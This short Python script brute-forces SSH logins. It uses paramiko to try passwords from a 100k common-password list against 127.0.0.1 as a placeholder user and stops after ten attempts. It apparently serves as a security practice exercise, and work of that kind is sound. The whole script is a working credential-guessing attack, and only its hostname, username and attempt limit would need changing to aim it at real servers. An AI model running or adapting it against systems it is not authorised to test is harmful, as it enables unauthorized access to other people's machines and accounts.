from pwn import *
import paramiko

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

found_valid_password = False

with open("100k-most-used-passwords-NCSC.txt", "r") as passwords_list:
    for attempt, password in enumerate(passwords_list):
        if attempt == 10:
            break
        password = password.strip("\n")
        print("[{}] Attempting password: '{}' !".format(attempt, password))
        try:
            client.connect(
                hostname="127.0.0.1",
                port=22,
                username="username",
                password=password,
                timeout=1
            )

            print("[>] Vald password found: '{}'!".format(password))
            found_valid_password = True
            break
        except paramiko.AuthenticationException:
            print(f"[X] Invalid password: '{password}'")
        except paramiko.SSHException as e:
            print(f"[!] SSH error: {e}")
        except Exception as e:
            print(f"[!] Other error: {e}")
        finally:
            client.close()

if not found_valid_password:
    print("No valid password found in the list.")
